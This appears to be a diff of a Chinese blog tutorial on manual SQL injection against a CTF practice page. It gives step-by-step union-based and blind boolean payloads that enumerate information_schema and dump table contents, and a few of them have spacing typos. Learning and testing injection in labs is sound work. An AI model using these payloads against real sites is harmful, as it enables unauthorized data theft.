@@ -3,10 +3,9 @@ layout: default
 ---
 
 
-最近一直在研究SQL注入攻击，现在对SQL注入进行一个总结：
 SQL注入的原理就不在这里赘述了，直接从攻击技巧开始：
 
-# 手工注入猜解流程 #
+## 手工注入猜解流程 ##
 假设我们现在以[http://ctf5.shiyanbar.com/8/index.php?id=1](http://ctf5.shiyanbar.com/8/index.php?id=1 "http://ctf5.shiyanbar.com/8/index.php?id=1")这个链接为例子，已知它的id是一个注入点：
 我们可以大概知道它的SQL语句大概是这么写的：
 
@@ -18,6 +17,7 @@ SQL注入的原理就不在这里赘述了，直接从攻击技巧开始：
 payload为：
 
     id=1 order by 1/2/3/4
+
 发现当使用order by 3的时候有报错回显，所以select 的字段一共是3个
 
 （2）得到显示位：
@@ -26,6 +26,7 @@ payload为：
 payload为：
 
     id=-1 union select 1,2,3 或者id=1 and 1=2 union select 1,2,3
+
 从中就可以判断到显示的是从select选出来的第几位和第几位的信息
 
 （3）查询数据库信息：
@@ -46,10 +47,12 @@ last_insert_id()---最后一次插入操作的id
 payload:
 
     id=-1 union select 1,2,SCHEMA_NAMEfrom information_schema.SCHEMATA limit 0,1 #得到第一个库名
+
 payload:
 
 
     id=-1 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1 #得到第二个库名
+
 或者是：
 
     id=-1 union select 1,2,group_concat(schema_name) from information_schema.SCHEMATA#
@@ -64,6 +67,7 @@ payload:
 payload:
 
     id=-1 union select 1,group_concat(table_name),3 from information_schema.tableswhere table_schema=database()
+
 这样我们就得到当前数据库下所有的表名了。页面返回的结果是：
 
 ![这里写图片描述](http://img.blog.csdn.net/20170111101516654?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
@@ -75,6 +79,7 @@ payload:
 payload：
 
     id=-1 union select 1,group_concat(column_name),3 from information_schema.columnswhere table_name='thiskey'
+
 如果'被屏蔽：
 payload：
 
@@ -87,6 +92,7 @@ payload：
 payload：
 
     id=1 and exists(selectk0y from thiskey)
+
 主要的语句就是exists(select 需要猜解的列名 from users)这种句式。如果在users表中不存在uname列名，则页面不会显示内容或者是直接出现sql的错误语句。
 
 (6)爆出字段内容
@@ -95,17 +101,20 @@ payload：
 payload：
 
     id=-1 union select 1,group_concat(k0y) from thiskey
+
 这个是最乐观的状态
 还有些情况需要一位一位的比较才能获取字段内容：（也就是sqlmap主要做的工作之一）
 
 payload:
 
     id=1 and ascii(substring((select concat(k0y,0x3a) from thiskey limit 0,1),1,1))>64
+
 意思为如果k0y第一条记录的第一位的ascii码>64则返回正常页面
 又或者是
 
     id=1 and ascii(substring((select k0y from thiskey),0,1))=119
 
     id=1 and ascii(substring((select k0y from thiskey),0,1))>64
+
 意思都是一样的
 这样通过不断比较可以获得字段具体内容
